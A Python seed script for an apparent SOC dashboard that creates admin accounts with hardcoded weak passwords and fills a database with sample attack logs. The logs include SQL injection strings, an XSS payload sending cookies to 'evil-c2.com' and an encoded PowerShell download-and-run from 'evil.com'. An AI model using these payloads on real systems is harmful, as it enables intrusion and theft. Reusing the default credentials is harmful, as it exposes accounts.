from datetime import datetime, timedelta, timezone
import random
from app.models import db, User, Log, Incident
from app.services.ai_analyzer import AIThreatAnalyzer
from app.utils.user_ledger import save_user_to_ledger, sync_users_from_ledger

def seed_database_if_empty():
    """
    Seeds initial admin, analyst, users, security telemetry logs, and incidents if database is empty.
    Also syncs registered users from persistent JSON ledger.
    """
    # Always sync registered users from persistent ledger first
    sync_users_from_ledger(db.session, User)

    # Create Default Users if missing
    if User.query.first() is None:
        print("Creating default SOC Dashboard user accounts...")
        mouli = User(username='moulikumar', email='chandammoulikumar@soc.internal', role='admin')
        mouli.set_password('Mouli@123')

        admin = User(username='admin', email='admin@soc.internal', role='admin')
        admin.set_password('Admin@123')

        analyst = User(username='analyst', email='analyst@soc.internal', role='analyst')
        analyst.set_password('Analyst@123')

        sec_user = User(username='user', email='user@soc.internal', role='user')
        sec_user.set_password('User@123')

        db.session.add_all([mouli, admin, analyst, sec_user])
        db.session.commit()

        for u in [mouli, admin, analyst, sec_user]:
            save_user_to_ledger(u)

    if Log.query.count() >= 20:
        return

    print("Seeding SOC Dashboard historical security logs & incidents...")

    admin = User.query.filter_by(username='admin').first()
    analyst = User.query.filter_by(username='analyst').first()

    # Sample IP addresses and attack scenarios
    attack_scenarios = [
        # Critical SQLi
        {
            'ip': '185.220.101.5',
            'event': "GET /api/v1/users?id=1' UNION SELECT 1,username,password_hash FROM users-- HTTP/1.1",
            'severity': 'Critical',
            'attack_type': 'SQL Injection',
            'risk_score': 96,
            'mitre': 'T1190 - Exploit Public-Facing Application',
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) sqlmap/1.6.11#stable'
        },
        {
            'ip': '45.154.255.82',
            'event': "POST /login HTTP/1.1 - Payload: username=admin' OR 1=1--&password=dummy",
            'severity': 'Critical',
            'attack_type': 'SQL Injection',
            'risk_score': 92,
            'mitre': 'T1190 - Exploit Public-Facing Application',
            'ua': 'Python-urllib/3.10'
        },
        # High XSS
        {
            'ip': '103.251.170.12',
            'event': "POST /comments HTTP/1.1 - Body: <script>document.location='http://evil-c2.com/steal?c='+document.cookie</script>",
            'severity': 'High',
            'attack_type': 'Cross Site Scripting (XSS)',
            'risk_score': 84,
            'mitre': 'T1059.007 - JavaScript Execution',
            'ua': 'Mozilla/5.0 (X11; Linux x86_64)'
        },
        {
            'ip': '194.26.29.114',
            'event': "GET /profile?name=%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E HTTP/1.1",
            'severity': 'High',
            'attack_type': 'Cross Site Scripting (XSS)',
            'risk_score': 78,
            'mitre': 'T1059.007 - JavaScript Execution',
            'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        },
        # High / Critical Malware
        {
            'ip': '193.42.33.18',
            'event': "OUTBOUND C2 Traffic - TCP 193.42.33.18:8443 Payload: Beacon-ID#9914 CobaltStrike HTTPS Heartbeat",
            'severity': 'Critical',
            'attack_type': 'Malware Indicators',
            'risk_score': 99,
            'mitre': 'T1071 - Application Layer Protocol',
            'ua': 'WinInet / CS-Beacon-Agent'
        },
        {
            'ip': '91.240.118.4',
            'event': "Powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA=",
            'severity': 'Critical',
            'attack_type': 'Malware Indicators',
            'risk_score': 97,
            'mitre': 'T1059.001 - PowerShell Execution',
            'ua': 'PowerShell/7.2'
        },
        # High Brute Force
        {
            'ip': '198.51.100.44',
            'event': "SSHD: 142 Failed password attempts for root from 198.51.100.44 port 48912 ssh2 within 45 seconds",
            'severity': 'High',
            'attack_type': 'Brute Force',
            'risk_score': 82,
            'mitre': 'T1110 - Brute Force',
            'ua': 'OpenSSH_8.9p1'
        },
        {
            'ip': '198.51.100.44',
            'event': "Excessive Failed Logins: 60 failed HTTP login requests targeting account 'administrator'",
            'severity': 'High',
            'attack_type': 'Excessive Failed Logins',
            'risk_score': 79,
            'mitre': 'T1110.001 - Password Guessing',
            'ua': 'Hydra/9.3'
        },
        # Medium Port Scanning
        {
            'ip': '162.243.140.2',
            'event': "FIREWALL ALERT: Port Scan detected from 162.243.140.2 hitting ports 21, 22, 23, 80, 443, 3306, 5432, 8080 in 2s",
            'severity': 'Medium',
            'attack_type': 'Port Scanning',
            'risk_score': 65,
            'mitre': 'T1046 - Network Service Discovery',
            'ua': 'Nmap Scripting Engine (NSE)'
        },
        {
            'ip': '162.243.140.2',
            'event': "TCP SYN Scan: 1024 ports probed on host 192.168.1.10",
            'severity': 'Medium',
            'attack_type': 'Port Scanning',
            'risk_score': 60,
            'mitre': 'T1046 - Network Service Discovery',
            'ua': 'Masscan/1.3'
        },
        # Suspicious Login
        {
            'ip': '109.236.87.19',
            'event': "AUTH WARNING: Successful admin login from untrusted IP 109.236.87.19 (Country: Unknown/Proxy) at 03:14 AM UTC",
            'severity': 'High',
            'attack_type': 'Suspicious Login',
            'risk_score': 76,
            'mitre': 'T1078 - Valid Accounts',
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        },
        # Low Severity Scenarios
        {
            'ip': '192.168.1.120',
            'event': "GET /../../etc/passwd HTTP/1.1 - Path Traversal Probe Neutralized",
            'severity': 'Low',
            'attack_type': 'Directory Traversal',
            'risk_score': 35,
            'mitre': 'T1083 - File and Directory Discovery',
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        },
        {
            'ip': '172.16.0.45',
            'event': "HTTP GET /robots.txt - Suspicious Automated Crawler Probing System Paths",
            'severity': 'Low',
            'attack_type': 'Web Reconnaissance',
            'risk_score': 25,
            'mitre': 'T1595 - Active Scanning',
            'ua': 'Go-http-client/1.1'
        },
        # Benign / Info
        {
            'ip': '192.168.1.50',
            'event': "HTTP GET /dashboard 200 OK - User 'analyst' logged in successfully",
            'severity': 'Info',
            'attack_type': 'Benign',
            'risk_score': 5,
            'mitre': 'N/A',
            'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        },
        {
            'ip': '192.168.1.51',
            'event': "DNS Query: api.github.com resolved to 140.82.121.4",
            'severity': 'Info',
            'attack_type': 'Benign',
            'risk_score': 2,
            'mitre': 'N/A',
            'ua': 'Internal Systems Daemon'
        },
        {
            'ip': '192.168.1.105',
            'event': "NTP time synchronization completed successfully with pool.ntp.org",
            'severity': 'Info',
            'attack_type': 'Benign',
            'risk_score': 0,
            'mitre': 'N/A',
            'ua': 'systemd-timesyncd'
        }
    ]

    now = datetime.now(timezone.utc)
    logs_created = []

    # Create 65 logs distributed from 14 days ago up to current time today
    for i in range(65):
        scenario = random.choice(attack_scenarios)
        if i < 15:
            days_offset = random.uniform(0.01, 0.95)  # Today's alerts
        else:
            days_offset = random.uniform(1.0, 14.0)   # Past 1-14 days

        log_time = now - timedelta(days=days_offset)

        log_item = Log(
            timestamp=log_time,
            source_ip=scenario['ip'],
            destination_ip='192.168.1.1',
            user_agent=scenario['ua'],
            event=scenario['event'],
            severity=scenario['severity'],
            attack_type=scenario['attack_type'],
            risk_score=scenario['risk_score'],
            mitre_technique=scenario['mitre'],
            raw_log=scenario['event'],
            status=random.choice(['Unassigned', 'Investigating', 'Mitigated', 'Closed']) if scenario['severity'] != 'Info' else 'Closed'
        )

        # Pre-populate AI analysis fallback for instant threat intelligence display
        ai_res = AIThreatAnalyzer.fallback_offline_analysis(log_item)
        log_item.ai_analysis = ai_res
        logs_created.append(log_item)

    db.session.add_all(logs_created)
    db.session.commit()

    # Create Sample Incidents linked to top critical logs
    critical_logs = Log.query.filter(Log.severity == 'Critical').limit(3).all()
    
    incidents = [
        Incident(
            title="CRITICAL: Outbound CobaltStrike C2 Beacon Detected",
            description="Host 193.42.33.18 initiated encrypted outbound HTTPS beaconing to suspicious external C2 IP. Immediate isolation and memory forensics required.",
            priority="Critical",
            status="In Progress",
            assigned_to_id=analyst.id if analyst else None,
            log_id=critical_logs[0].id if len(critical_logs) > 0 else None,
            mitigation_notes="Isolated host at core switch level. Extracted RAM image for Volatility triage."
        ),
        Incident(
            title="HIGH: Automated SQL Injection Attack Vector targeting API",
            description="Multiple SQLi payloads (UNION SELECT and OR 1=1) observed against public endpoints from IP 185.220.101.5.",
            priority="High",
            status="Open",
            assigned_to_id=analyst.id if analyst else None,
            log_id=critical_logs[1].id if len(critical_logs) > 1 else None,
            mitigation_notes="WAF block rule pending review."
        ),
        Incident(
            title="HIGH: SSH Password Spraying & Brute Force",
            description="Over 140 failed SSH attempts targeting root user from external IP 198.51.100.44.",
            priority="High",
            status="Resolved",
            assigned_to_id=admin.id if admin else None,
            log_id=None,
            mitigation_notes="IP 198.51.100.44 permanently banned in IPTables. Disabled root password SSH login."
        ),
        Incident(
            title="MEDIUM: Reconnaissance Port Scanning Campaign",
            description="Stealth SYN scan probed multiple database and remote desktop service ports from 162.243.140.2.",
            priority="Medium",
            status="Closed",
            assigned_to_id=analyst.id if analyst else None,
            log_id=None,
            mitigation_notes="Scan blocked by automatic IPS shunning rule."
        )
    ]

    for inc in incidents:
        inc.add_timeline_note('System', 'Incident automatically created from SOC detection engine alert.')
        if inc.mitigation_notes:
            author_name = inc.assigned_analyst.username if (hasattr(inc, 'assigned_analyst') and inc.assigned_analyst) else 'Analyst'
            inc.add_timeline_note(author_name, inc.mitigation_notes)

    db.session.add_all(incidents)
    db.session.commit()
    print("Database successfully populated with realistic SOC telemetry!")
